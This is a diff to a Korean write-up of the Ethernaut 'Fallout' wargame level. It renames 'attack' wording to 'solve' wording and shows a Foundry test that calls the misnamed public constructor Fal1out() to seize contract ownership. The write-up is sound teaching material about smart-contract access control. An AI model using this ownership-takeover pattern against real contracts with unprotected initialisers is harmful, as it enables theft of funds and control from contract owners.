@@ -75,29 +75,29 @@ function Fal1out() public payable {
 
 어떤 주소든 `Fal1out()`을 호출하면 `owner`를 자신의 주소로 덮어쓸 수 있습니다. 일회성 초기화 검사나 접근 제어도 없으므로 이 함수는 반복해서 호출할 수 있습니다.
 
-## 공격 흐름
+## 풀이 흐름
 
 ```text
 Fallout 컨트랙트 배포
         ↓
 생성자로 의도한 함수가 public 상태로 남음
         ↓
-공격자가 1 wei와 함께 Fal1out() 호출
+플레이어가 1 wei와 함께 Fal1out() 호출
         ↓
-owner = attacker
+owner = player
         ↓
-소유권 탈취 확인
+소유권 변경 확인
 ```
 
-## Foundry 공격 코드
+## Foundry 풀이 코드
 
 ```solidity
-function testExploit() public {
-    vm.startPrank(attacker);
+function testSolve() public {
+    vm.startPrank(player);
 
-    falloutContract.Fal1out{value: 1 wei}();
+    target.Fal1out{value: 1 wei}();
 
-    assertEq(falloutContract.owner(), attacker);
+    assertEq(target.owner(), player);
 
     vm.stopPrank();
 }
@@ -121,7 +121,7 @@ interface IFallout {
 Foundry가 구버전 컨트랙트를 별도로 컴파일하게 하고, 테스트에서는 해당 artifact를 직접 배포합니다.
 
 ```solidity
-falloutContract = IFallout(deployCode("02_Fallout.sol:Fallout"));
+target = IFallout(deployCode("02_Fallout.sol:Fallout"));
 ```
 
 이 방식은 원본 Solidity 버전과 취약한 동작을 보존하면서도 최신 forge-std를 테스트 환경에서 사용할 수 있게 합니다.
